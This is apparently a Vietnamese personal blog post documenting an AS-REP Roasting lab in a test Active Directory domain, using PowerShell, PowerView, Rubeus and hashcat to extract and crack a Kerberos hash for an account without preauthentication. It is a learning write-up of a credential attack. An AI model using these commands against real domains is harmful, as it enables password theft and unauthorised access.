<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>IredTeam AS-REP Roasting | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="IredTeam AS-REP RoastingAS-REP là gì?AS-REP (viết tắt của Authentication Service Reply) là một thông điệp trong giao thức xác thực Kerberos. Đây là bước thứ hai trong quá trình xác thực ban đầu, được">
<meta property="og:type" content="article">
<meta property="og:title" content="IredTeam AS-REP Roasting">
<meta property="og:url" content="https://pzhat.github.io/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="IredTeam AS-REP RoastingAS-REP là gì?AS-REP (viết tắt của Authentication Service Reply) là một thông điệp trong giao thức xác thực Kerberos. Đây là bước thứ hai trong quá trình xác thực ban đầu, được">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-12-01T19:26:14.492Z">
<meta property="article:modified_time" content="2025-12-01T19:26:39.009Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Pentest">
<meta property="article:tag" content="RedTeam">
<meta property="article:tag" content="iredteam">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "IredTeam AS-REP Roasting",
  "url": "https://pzhat.github.io/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-12-01T19:26:14.492Z",
  "dateModified": "2025-12-01T19:26:39.009Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'IredTeam AS-REP Roasting',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">IredTeam AS-REP Roasting</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">IredTeam AS-REP Roasting</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-01T19:26:14.492Z" title="Created 2025-12-02 02:26:14">2025-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-01T19:26:39.009Z" title="Updated 2025-12-02 02:26:39">2025-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/">RedTeam</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/RedTeam/pentesting/">pentesting</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="IredTeam-AS-REP-Roasting"><a href="#IredTeam-AS-REP-Roasting" class="headerlink" title="IredTeam AS-REP Roasting"></a>IredTeam AS-REP Roasting</h1><h3 id="AS-REP-la-gi"><a href="#AS-REP-la-gi" class="headerlink" title="AS-REP là gì?"></a>AS-REP là gì?</h3><p><code>AS-REP</code> (viết tắt của Authentication Service Reply) là một <code>thông điệp</code> trong giao thức xác thực <code>Kerberos</code>. Đây là bước thứ hai trong quá trình xác thực ban đầu, được gửi từ <code>Key Distribution Center (KDC)</code>, thường là một Domain Controller trong môi trường Active Directory, đến người dùng.</p>
<p>Thông điệp này chứa <code>Ticket-Granting Ticket (TGT)</code>, một ticket được mã hóa dùng để yêu cầu các vé dịch vụ khác mà không cần người dùng phải nhập lại mật khẩu. Một phần của thông điệp <code>AS-REP</code> này được mã hóa bằng chính <code>hash</code> mật khẩu của người dùng.</p>
<h3 id="Ky-thuat-AS-REP-Roasting"><a href="#Ky-thuat-AS-REP-Roasting" class="headerlink" title="Kỹ thuật AS-REP Roasting"></a>Kỹ thuật AS-REP Roasting</h3><p><code>AS-REP Roasting</code> là một kỹ thuật tấn công trong đó kẻ tấn công có thể lấy được thông điệp AS-REP của một người dùng và cố gắng <code>offline crack</code> mật khẩu của người dùng đó.</p>
<p>Cuộc tấn công này chỉ có thể thực hiện được khi một tài khoản người dùng trong <code>Active Directory</code> được cấu hình với thuộc tính <code>Do not require Kerberos preauthentication</code> (Không yêu cầu xác thực trước Kerberos) được bật.</p>
<h3 id="Tai-sao-lai-co-thuoc-tinh-“Khong-yeu-cau-xac-thuc-truoc”"><a href="#Tai-sao-lai-co-thuoc-tinh-“Khong-yeu-cau-xac-thuc-truoc”" class="headerlink" title="Tại sao lại có thuộc tính “Không yêu cầu xác thực trước”?"></a>Tại sao lại có thuộc tính “Không yêu cầu xác thực trước”?</h3><p>Xác thực trước <code>(Pre-authentication)</code> là một cơ chế bảo mật mặc định của Kerberos. Trước khi KDC cấp TGT, nó yêu cầu người dùng phải chứng minh rằng họ biết mật khẩu bằng cách gửi một yêu cầu ban đầu <code>(AS-REQ)</code> có chứa một dấu thời gian (timestamp) được mã hóa bằng hash mật khẩu của họ. Điều này ngăn chặn các cuộc tấn công đoán mật khẩu trực tiếp vào KDC.</p>
<p>Tuy nhiên, một số ứng dụng hoặc hệ thống cũ không tương thích với cơ chế này, vì vậy quản trị viên có thể tắt nó đi cho một số tài khoản nhất định. Đây chính là lỗ hổng mà kỹ thuật <code>AS-REP Roasting</code> khai thác.</p>
<h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><h4 id="Buoc-1-Tao-user-moi-va-bat-do-not-require-Kerberos-preauthentication"><a href="#Buoc-1-Tao-user-moi-va-bat-do-not-require-Kerberos-preauthentication" class="headerlink" title="Buớc 1: Tạo user mới và bât do not require Kerberos preauthentication"></a>Buớc 1: Tạo user mới và bât do not require Kerberos preauthentication</h4><p>Ở đây ta sẽ sử dụng powershell với 2 câu lệnh sau : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tạo user mới</span></span><br><span class="line"><span class="built_in">New-ADUser</span> <span class="literal">-Name</span> <span class="string">&quot;asrep_test&quot;</span> `</span><br><span class="line">           <span class="literal">-SamAccountName</span> <span class="string">&quot;asrep_test&quot;</span> `</span><br><span class="line">           <span class="literal">-UserPrincipalName</span> <span class="string">&quot;asrep_test@offense.local&quot;</span> `</span><br><span class="line">           <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;P@ssw0rd123!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) `</span><br><span class="line">           <span class="literal">-Enabled</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Đã tạo user &#x27;asrep_test&#x27; với mật khẩu &#x27;P@ssw0rd123!&#x27;.&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/S1ll_oqil-x.png" alt="image"></p>
<p>Thành công tạo user mới bây giờ config lại quyền authen cho nó với lệnh sau : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tắt yêu cầu pre-auth → mở cửa cho AS-REP Roasting</span></span><br><span class="line"><span class="built_in">Set-ADAccountControl</span> <span class="literal">-Identity</span> <span class="string">&quot;asrep_test&quot;</span> <span class="literal">-DoesNotRequirePreAuth</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Đã tắt Kerberos pre-authentication cho &#x27;asrep_test&#x27;.&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/B1Dhs5olZl.png" alt="image"></p>
<p>Thành công tắt đi quyền pre-auth của user trên bây giờ ta đi đến bước tấn công.</p>
<h4 id="Buoc-2-Liet-ke-user-co-the-tan-cong"><a href="#Buoc-2-Liet-ke-user-co-the-tan-cong" class="headerlink" title="Bước 2: Liệt kê user có thể tấn công"></a>Bước 2: Liệt kê user có thể tấn công</h4><p>Bây giờ ta sử dụng 2 lệnh sau : </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Import PowerView</span></span><br><span class="line">. .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Liệt kê user có DONT_REQ_PREAUTH</span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>Lệnh này giúp ta chạy powerview sau đó từ powerview ta sẽ tiến hành truy vấn tìm kiếm các user có được config no pre-auth.</p>
<p><img src="https://hackmd.io/_uploads/rJ5y65ilWx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1uF69oebx.png" alt="image"></p>
<p>Thành công tìm được user <code>asrep_victim</code> có thể thấy được nó đã được gán quyền <code>DONT_REQ_PREAUTH</code> bây giờ ta sẽ đi tới bước tiếp theo.</p>
<h4 id="Su-dung-tool-Ruberus-de-thuc-hien-AS-REP-Roasting"><a href="#Su-dung-tool-Ruberus-de-thuc-hien-AS-REP-Roasting" class="headerlink" title="Sử dụng tool Ruberus để thực hiện AS-REP Roasting"></a>Sử dụng tool Ruberus để thực hiện AS-REP Roasting</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Chạy Rubeus và lưu output</span></span><br><span class="line"><span class="variable">$hash</span> = .\Rubeus.exe asreproast /user:asrep_test /domain:offense.local /format:john <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hiển thị hash</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Hash AS-REP nhận được:&quot;</span> <span class="literal">-ForegroundColor</span> Cyan</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="variable">$hash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lưu hash vào file để crack sau</span></span><br><span class="line"><span class="variable">$hash</span> | <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> asrep.hash <span class="literal">-Encoding</span> ASCII</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Đã lưu hash vào: C:\Tools\asrep.hash&quot;</span> <span class="literal">-ForegroundColor</span> Green</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/SyunWsolWl.png" alt="image"></p>
<p>Thành công lấy được hash bây giờ thì ta tới với bước crack thôi.</p>
<h4 id="Crack-password-bang-hashcat"><a href="#Crack-password-bang-hashcat" class="headerlink" title="Crack password bằng hashcat"></a>Crack password bằng hashcat</h4><p>Sau khi có được AS-REP hash rồi thì ta sẽ lưu nó vào một file ở đây tôi lưu nó trong file <code>asrep.hash</code>.</p>
<p>Sau đó sử dụng hashcat với lệnh : </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 asrep.hash mywordlist.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/Hk4_jPo-bg.png" alt="image"></p>
<p>Từ đây thành công crack ra password của user mà ta cần phải tấn công và hoàn thành lab.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/">https://pzhat.github.io/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RedTeam/">RedTeam</a><a class="post-meta__tags" href="/tags/Pentest/">Pentest</a><a class="post-meta__tags" href="/tags/iredteam/">iredteam</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Tryhackme Hammer challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">TryHackMe Hammer Web Challenge WriteUp Enumeration Tại đây, mình tiến hành scan và được 2 port đang mở bao gồm :   22&#x2F;tcp : đây là port SSH 1337&#x2F;tcp : đây là port của một cái http service và cái web app này được host lên bằng apache httpd. Bây giờ mình sẽ truy cập vào trang web.  Exploitation Sau khi truy cập web trả về cho mình một trang login. Vấn đề ở đây là mình không hề có account để truy cập vậy nên mình sẽ thử với các gói request qua burp proxy.  Kiểm tra request thì ngoài tr...</div></div></div></a><a class="pagination-related" href="/2025/12/01/2025-12-01-SSTI-Lab/" title="ServerSide Template Injection (SSTI) Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">ServerSide Template Injection (SSTI) Lab</div></div><div class="info-2"><div class="info-item-1">ServerSide Template Injection (SSTI) LabSSTI là gìServer-Side Template Injection (SSTI) là một lỗ hổng bảo mật web nghiêm trọng cho phép kẻ tấn công chèn mã độc vào template của ứng dụng, dẫn đến việc mã này được thực thi trên phía server. Lỗ hổng này thường xảy ra khi dữ liệu đầu vào từ người dùng được nối trực tiếp vào template thay vì được truyền dưới dạng dữ liệu an toàn. Cơ chế hoạt động của SSTISSTI xảy ra khi web app sử dụng template engine để hiển thị nội dung động (dynamic) nhưng lại...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-10-30-iredteam-from-DA-to-EA/" title="Ired.Team From Domain Admin to Enterprise Admin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team From Domain Admin to Enterprise Admin</div></div><div class="info-2"><div class="info-item-1">Ired.Team From Domain Admin to Enterprise AdminOverviewỞ lab này ta sẽ lợi dụng mối quan hệ giữa Parent-Child domain từ đó lợi dụng mối quan hệ đó và gây nên leo thang đặc quyền. Build lab SetUp domain đặt tên là offense.local đây là domain cha với IP là 192.168.10.10/24 và DNS: 127.0.0.1.   Đã cài xong Active Directory Domain Services (AD DS).  Đã promote máy thành Domain Controller cho domain: offense.local.  Đã có DNS Server chạy trên DC.  Đang dùng VMware host-only network.   Sau đó setup...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team Kerberoasting (Credential Access)</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberoasting (Credential Access)Giải thích về các khái niệmKerberos trong Active Directory Trong môi trường Windows Active Directory (AD), Kerberos là giao thức xác thực mặc định. Nó sử dụng các ticket để xác thực người dùng và dịch vụ mà không truyền mật khẩu qua mạng.  Các thành phần chính:  KDC (Key Distribution Center): Thường là Domain Controller (DC). TGT (Ticket Granting Ticket): Cấp cho user sau khi đăng nhập thành công → dùng để xin ticket cho dịch vụ. TGS (Ticket Granting...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team Kerberos Golden Tickets Lab</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberos: Golden Tickets LabOverviewLab này khám phá một cuộc tấn công vào Kerberos Authentication của Active Directory(AD). Chính xác hơn, đây là một cuộc tấn công giả mạo Vé cấp quyền Kerberos (TGT) được sử dụng để xác thực User bằng Kerberos. TGT được sử dụng khi Ticket Granting Service (TGS), nghĩa là một TGT giả có thể giúp chúng ta có được bất kỳ ticket TGS nào. Mục tiêu của lab (Lab Goal)Tạo một Golden Ticket – một Ticket Granting Ticket (TGT) giả mạo – cho phép bạn:  Xác thự...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-15-I.redteam-Kerberos-Silver-Ticket/" title="Ired.Team Kerberos Silver Ticket Execution"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Ired.Team Kerberos Silver Ticket Execution</div></div><div class="info-2"><div class="info-item-1">Ired.Team Kerberos Silver TicketTiếp tục chuỗi series AD abuse thì tiếp theo ta tiến tới Kerberos Silver Ticket có nghĩa là ta sẽ hack quyền từ Kerberos nhưng không phải tạo golden ticket để truy cập mọi tài nguyên trong DC mà ở đây ta chỉ tạo Silver Ticket có quyền truy cập một số tài nguyên nhất định vì đôi khi ta cũng không cần phải full quyền để làm gì nhiều lúc sẽ dễ bị phát hiện nên ta chỉ cần lấy một vài tài nguyên, chính điều đó thì Silver Ticket ra đời. ExecutionBước 1: Chuẩn bị môi ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Pickle-Rick-THM/" title="TryHackme Pickle Rick Challenge WriteUp by Phatmh."><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">TryHackme Pickle Rick Challenge WriteUp by Phatmh.</div></div><div class="info-2"><div class="info-item-1">TryHackme Pickle Rick Challenge WriteUp by Phatmh.[link challenge]:https://tryhackme.com/room/picklerickTiến hành dùng Openvpn kết nối với Tryhackme.Tiến hành kiểm tra mình đã cùng mạng mới máy bên Tryhackme hay chưa.Câu hỏi và Ip của challenge nãy đã test và kết nối thành công. Bước 1: ReconSử dụng Nmap để tiến hành kiểm tra xem có port nào đang được mở ra, ở đây phát hiện ra được bên máy đang mở port 22&#x2F;tcp và port 88&#x2F;tcp ở đây tôi nghĩ là server nạn nhân đang chạy SSH và HTTP. Tư...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-THM-EvilGPT/" title="Tryhackme EvilGPT challenge WriteUp by @phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Tryhackme EvilGPT challenge WriteUp by @phatmh</div></div><div class="info-2"><div class="info-item-1">Tryhackme EvilGPT challenge WriteUp by @phatmhDùng netcat để tiến hành kết nối với chall và tiến hành LLM Inject để có thể moi được flag từ con AI.Sau khi test thử thì đây không phải con AI bình thường như tôi nghĩ mà nó là một con AI thực thi các câu lệnh OS vậy bây giờ tiến hành thử moi ra các thứ có trong server.Tiến hành đọc thử source code của con AI xem nó có những cái gì. Tóm tắt chức năngTập tin Python evilai.py là một server Telnet đơn giản. Khi người dùng kết nối, nó: Nhận yêu cầu t...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, 